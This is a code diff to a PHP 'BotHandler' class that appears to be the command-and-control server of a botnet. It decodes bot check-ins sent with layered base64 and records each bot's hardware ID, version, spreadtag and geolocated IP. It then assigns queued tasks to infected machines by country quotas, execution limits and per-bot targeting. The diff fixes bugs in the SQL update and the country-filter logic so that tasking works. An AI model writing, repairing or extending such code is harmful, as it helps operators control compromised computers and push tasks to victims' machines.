@@ -53,7 +53,7 @@ class BotHandler
         //Decrypt Main Requests
         if (!empty($_POST["request"])) {
 
-           // $signal = base64_decode($this->xor_this(base64_decode($_POST["request"])));
+            // $signal = base64_decode($this->xor_this(base64_decode($_POST["request"])));
             $signal = base64_decode(base64_decode($_POST["request"]));
 
             parse_str($signal, $postbot);
@@ -65,20 +65,20 @@ class BotHandler
             $reader = new Reader(__DIR__ . '/../../Geo/GeoLite2-City.mmdb');
 
             if (!empty($_SERVER['REMOTE_ADDR'])) {
-               try{
-                   $ip = $_SERVER['REMOTE_ADDR'];
-                   $record = $reader->city($ip);
-                   $country = $record->country->isoCode;
-                   $countryName = $record->country->name;
-                   $countryCity = $record->city->name;
-                   $countryLatitude = $record->location->latitude;
-                   $countryLongitude = $record->location->longitude;
-               }catch (Exception $e){
-                   $country = "unknow";
-                   $countryLatitude = "unknow";
-                   $countryLongitude = "unknow";
-                   $countryName = "unknow";
-               }
+                try{
+                    $ip = $_SERVER['REMOTE_ADDR'];
+                    $record = $reader->city($ip);
+                    $country = $record->country->isoCode;
+                    $countryName = $record->country->name;
+                    $countryCity = $record->city->name;
+                    $countryLatitude = $record->location->latitude;
+                    $countryLongitude = $record->location->longitude;
+                }catch (Exception $e){
+                    $country = "unknow";
+                    $countryLatitude = "unknow";
+                    $countryLongitude = "unknow";
+                    $countryName = "unknow";
+                }
             } else {
                 $country = "unknow";
                 $countryLatitude = "unknow";
@@ -98,7 +98,7 @@ class BotHandler
                     $postbot["spreadtag"] = "none";
                 }
                 $statement = $GLOBALS["pdo"]->prepare("UPDATE bots SET lastresponse = CURRENT_TIMESTAMP(), ip = ?, version = ?, country = ?, spreadtag = ?, countryName = ?  WHERE hwid = ?");
-                $statement->execute(array($ip,$postbot["botversion"], $postbot["hwid"], $country, $postbot["spreadtag"],$countryName));
+                $statement->execute(array($ip,$postbot["botversion"],  $country, trim($postbot["spreadtag"]),$countryName,$postbot["hwid"]));
                 $cmds = $GLOBALS["pdo"]->query("SELECT * FROM tasks ORDER BY id");
                 while ($com = $cmds->fetch(PDO::FETCH_ASSOC)) {
                     if ($com['status'] == "1") {
@@ -121,18 +121,22 @@ class BotHandler
                                     if (is_array($filter)) {
                                         // Search Country in Filter if not found die
                                         if (!empty($filter["country"])) {
-                                            if (!preg_match('/\b' . $country . '\b/', $filter["country"])) {
+                                            if (strpos( $filter["country"], $country ) !== false) {
 
                                                 //Country Possible check current countries and difference
                                                 if($com["execution_limit"] > 1){
                                                     $mixArray = explode(", ",$filter["country"]);
                                                     $botsDifference = number_format($com["execution_limit"] / count($mixArray),0);
-                                                    $executions_querry = $GLOBALS["pdo"]->prepare("SELECT COUNT(*) as executions FROM tasks_completed WHERE taskid = :i AND country = :country");
+                                                    $executions_querry = $GLOBALS["pdo"]->prepare("SELECT COUNT(*) as executions FROM tasks_completed
+                                                    LEFT JOIN bots ON tasks_completed.bothwid = bots.hwid
+                                                     WHERE tasks_completed.taskid = :i AND bots.country = :country");
                                                     $executions_querry->execute(array(":i" => $com['id'],":country" => $country));
                                                     if($executions_querry->fetchColumn(0) >= $botsDifference){
                                                         continue;
                                                     }
                                                 }
+                                                
+                                            }else{
                                                 continue;
                                             }
                                         }
@@ -147,11 +151,11 @@ class BotHandler
                                         //Check if Bot Multi Ececution
                                         if (!empty($filter["multibot"])) {
                                             $bots = explode(",",$filter["multibot"]);
-                                                foreach($bots as $execute_on_id){
-                                                    if (intval($execute_on_id) != intval($bot["id"])) {
-                                                        continue;
-                                                    }
+                                            foreach($bots as $execute_on_id){
+                                                if (intval($execute_on_id) != intval($bot["id"])) {
+                                                    continue;
                                                 }
+                                            }
                                         }
 
                                         if (!empty($filter["version"])) {
